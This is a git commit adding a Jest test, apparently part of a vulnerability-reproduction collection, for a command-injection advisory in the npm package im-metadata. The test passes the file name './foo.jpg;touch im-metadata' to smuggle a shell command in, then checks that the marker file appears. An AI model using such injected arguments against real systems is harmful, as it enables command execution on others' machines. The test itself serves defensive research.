09700735f99044fed7b1d24fd939a301fce5e44b
Filipe Marques <filipe.s.marques@tecnico.ulisboa.pt>
2025-04-25 17:10:38 +0100

    Add GHSA-qfxv-qqvg-24pg

---
+++ examples/command-injection/GHSA-qfxv-qqvg-24pg/im-metadata.test.js
@@ -0,0 +1,22 @@
+test("Command Injection in im-metadata", (done) => {
+  expect.assertions(2);
+  const metadata = require("im-metadata");
+  const fs = require("fs");
+
+  const path = "./im-metadata";
+  if (fs.existsSync(path))
+    fs.unlinkSync(path);
+
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  metadata("./foo.jpg;touch im-metadata", { exif: true }, function(
+    error,
+    metadata
+  ) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function(err) {
+      done();
+    });
+  });
+});
